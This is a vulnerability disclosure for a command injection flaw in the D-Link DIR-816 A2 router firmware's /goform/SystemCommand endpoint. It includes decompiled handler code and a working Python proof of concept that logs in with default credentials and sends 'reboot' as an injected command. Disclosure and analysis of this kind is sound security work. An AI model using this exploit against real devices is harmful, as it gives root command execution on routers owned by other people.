## DIR 816

> bin_vision:DIR-816A2_FWv1.10CNB05_R1B011D88210 / DIR-816A2_v1.10CNB03_D77137
> goahead
> goform/SystemCommand
>
> type: command injection
> string: command

### description

The `SystemCommand` handler receives the user-controlled `command` parameter from the GoAhead web request. The value is read directly via `websGetVar()` with no sanitization or shell metacharacter filtering. The input is interpolated into a command string with `snprintf()` and then passed to `doSystem()`, which executes it through the shell.

Vulnerability chain: `websGetVar("command")` -> `snprintf("%s 1>/var/system_command.log 2>&1")` -> `doSystem(buf)`.

An authenticated attacker who can access the system command page can execute arbitrary system commands on the device with root privileges.

### code

#### formSystemCommand handler

~~~c
  websFormDefine("SystemCommand", (int)sub_458280);
~~~

~~~c
const char *__fastcall sub_458280(int a1)
{
  const char *result;
  result = (const char *)websGetVar(a1, "command", "");    // <--- Read user-controlled command from the request
  if ( result )
  {
    if ( *result )
    {
      // User input directly interpolated into command string - NO SANITIZATION
      snprintf(&byte_4836B0, 1024, "%s 1>%s 2>&1", result, "/var/system_command.log");
    }
    else
    {
      snprintf(&byte_4836B0, 1024, "cat /dev/null > %s", "/var/system_command.log");
    }
    doSystem(&byte_4836B0);  // <--- Direct execution of attacker-controlled string
    return (const char *)websRedirect(a1, "adm/system_command.asp");
  }
  return result;
}
~~~

### PoC

Source: `PoC/CNB05_FWv1.10/verified/poc_SystemCommand.py`

```python
"""
D-Link DIR-816 A2 - Direct Command Execution (SystemCommand)
Firmware: DIR-816A2_FWv1.10CNB05_R1B011D88210
Entry: 000239
Endpoint: /goform/SystemCommand
Parameter: command
Sink: doSystem("%s 1>/var/system_command.log 2>&1") - NO FILTER
"""

import requests
import base64
import time
import sys
import re

ROUTER_IP = "192.168.1.1"
USERNAME = "Admin"
PASSWORD = ""


def get_session():
    s = requests.Session()
    username_b64 = base64.b64encode(USERNAME.encode()).decode()
    password_b64 = base64.b64encode(PASSWORD.encode()).decode()
    login_data = {"username": username_b64, "password": password_b64}
    resp = s.post(f"http://{ROUTER_IP}/goform/formLogin", data=login_data, timeout=10)
    tokenid = ""
    match = re.search(r'tokenid"\s*value="(\d+)"', resp.text)
    if match:
        tokenid = match.group(1)
    return s, tokenid


def exploit():
    print(f"[*] Target: {ROUTER_IP}")
    print(f"[*] Vulnerability: Direct Command Execution (SystemCommand)")
    print(f"[*] Endpoint: /goform/SystemCommand")
    print(f"[*] Parameter: command")
    print()
    print("[*] Logging in...")
    s, tokenid = get_session()
    if not tokenid:
        print("[-] Failed to get tokenid")
        sys.exit(1)
    print(f"[*] Got tokenid: {tokenid}")

    payload = "reboot"
    data = {"tokenid": tokenid, "command": payload}
    print(f"[*] Sending payload: {payload}")
    start = time.time()
    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/SystemCommand", data=data, timeout=30)
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Request timed out after {elapsed:.2f}s")
        return
    except requests.exceptions.ConnectionError:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Connection lost after {elapsed:.2f}s (device rebooted)")
        return
    elapsed = time.time() - start
    print(f"[*] Response time: {elapsed:.2f}s")

    # For reboot payload: device responds quickly then goes offline
    print("[*] Waiting 8s to check if device rebooted...")
    time.sleep(8)
    try:
        check = requests.get(f"http://{ROUTER_IP}/", timeout=5)
        print(f"[-] Device still online ({check.status_code}) — payload did not execute")
    except Exception:
        print("[+] VULNERABLE! Device went offline after payload (rebooted)")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ROUTER_IP = sys.argv[1]
    exploit()
```
